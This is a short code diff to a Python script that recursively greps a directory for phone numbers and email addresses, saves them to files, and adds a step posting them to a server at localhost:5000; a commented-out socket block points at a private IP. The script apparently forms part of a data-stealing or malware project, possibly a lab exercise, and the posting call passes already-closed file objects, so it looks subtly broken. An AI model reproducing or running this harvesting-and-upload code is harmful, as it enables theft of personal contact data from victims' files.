@@ -8,6 +8,7 @@ from Crypto.PublicKey import RSA
 from Crypto import Random
 from base64 import b64decode
 import sys
+import requests
 
 grep_numbers = "grep -roh '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -]\?[0-9]\{3\}[ -]\?[0-9]\{4\}' . | sort -u > phonenumbers.txt"
 grep_emails = "grep -Eroh '\\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\\b' . | sort -u > emails.txt"
@@ -40,6 +41,9 @@ fp_emails.seek(0)
 
 fp_numbers.close()
 fp_emails.close()
+
+r = requests.post("http://localhost:5000", data={'numbers': fp_numbers, 'emails': fp_emails})
+print(r.text) # displays the result body.
 
 # s = socket.socket()         # Create a socket object
 # host = '10.0.2.15'  
